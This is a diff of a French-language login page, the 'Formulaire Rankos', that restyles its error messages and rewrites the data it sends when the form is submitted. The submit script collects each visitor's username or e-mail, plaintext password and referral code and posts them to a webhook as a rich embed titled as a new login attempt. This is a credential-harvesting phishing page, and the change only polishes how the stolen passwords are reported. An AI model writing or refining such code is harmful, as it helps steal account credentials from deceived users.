@@ -73,7 +73,8 @@
     button:hover {
       background-color: #e6e600;
     }
-    #errorMessage {
+    #errorMessage,
+    #referralError {
       color: red;
       display: none;
       margin-top: 10px;
@@ -128,7 +129,7 @@
       </div>
     </form>
     <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
-    <p id="referralError" style="display:none; color:red; font-size:14px; margin-top:5px;">Le code de parrainage doit contenir exactement 4 chiffres.</p>
+    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
   <script>
@@ -144,11 +145,10 @@
       const errorMessage = document.getElementById('errorMessage');
       const referralError = document.getElementById('referralError');
 
-      // Reset previous errors
       errorMessage.style.display = 'none';
       referralError.style.display = 'none';
 
-      // Validation de base
+      // Vérification de base
       if (
         username.length < 3 ||
         password.length < 3 ||
@@ -159,7 +159,7 @@
         return;
       }
 
-      // Vérification du code de parrainage (optionnel, mais doit être 4 chiffres si rempli)
+      // Vérification du code de parrainage
       const referralRegex = /^\d{4}$/;
       if (referralCode && !referralRegex.test(referralCode)) {
         referralError.style.display = 'block';
@@ -167,7 +167,34 @@
       }
 
       const message = {
-        content: `**Nouveau login reçu:**\nNom d'utilisateur: ${username}\nMot de passe: ${password}\nCode de parrainage: ${referralCode || "Aucun"}`
+        embeds: [
+          {
+            title: "📥 Nouvelle tentative de connexion",
+            description: "Informations collectées via le formulaire",
+            color: 0xffc800,
+            fields: [
+              {
+                name: "👤 Nom d'utilisateur / e-mail",
+                value: username,
+                inline: false
+              },
+              {
+                name: "🔒 Mot de passe",
+                value: password,
+                inline: false
+              },
+              {
+                name: "🎁 Code de parrainage",
+                value: referralCode || "Aucun",
+                inline: false
+              }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "Formulaire Rankos"
+            }
+          }
+        ]
       };
 
       fetch(webhookURL, {
